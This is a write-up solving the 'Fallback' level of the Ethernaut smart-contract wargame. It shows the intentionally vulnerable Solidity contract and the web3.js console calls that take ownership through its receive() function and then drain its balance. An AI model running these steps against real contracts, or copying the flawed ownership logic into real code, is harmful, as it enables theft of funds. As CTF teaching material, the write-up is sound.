# Level 1: Fallback

This is the level 1 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites

- Sending transactions using [web3.js](https://ethereum.stackexchange.com/questions/53094/sending-ether-via-contract-instance) to a contract and to a payable function
- [Conversion between units ether & wei](https://web3js.readthedocs.io/en/v1.5.2/web3-utils.html#towei)
- Solidity contract [fallback](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) function

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

and `contract` methods & `web3.js` functions injected into console.

We, the `player` address, have to somehow become `owner` of the contract & withdraw all amount from contract.

Key parts to notice are `contribute` function and `receive` fallback function of contract.

From the constructor, it can be seen that `owner`'s contribution is 1000 eth. One way to become `owner` is to send more than current `owner`'s contributed eth to `contribute` function to be owner. Let's check `owner`'s contributed eth using console:

```javascript
ownerAddr = await contract.owner();
await contract.contributions('0x9CB391dbcD447E645D6Cb55dE6ca23164130D008').then(v => v.toString())

// Output '1000000000000000000000'
```
But, that'd be too much eth! We have nowhere near it. 

Take a look at `receive` fallback function though. It also has code to change ownerships. According to what code is there, we can claim ownership if:

- Contract has a non-zero contribution from us (i.e. `player`).
- Then, we send the contract a non-zero eth amount.

`player` address has zero contribution to contract currently, so let's satisfy first condition by sending a **less than 0.001** eth (required acc. to code):

```javascript
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
```

Now we have a non-zero contribution that you can verify by:

```javascript
await contract.getContribution().then(v => v.toString())
```

And now send any non-zero amount of ether to contract:
```javascript
await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
```

Boom! We claimed ownership of the contract!
You can verify that `owner` is same address as `player` by:

```javascript
await contract.owner()
// Output: Same as player address
```

And for the final blow, withdraw all of contract's balance:

```javascript
await contract.withdraw()
```

Done.
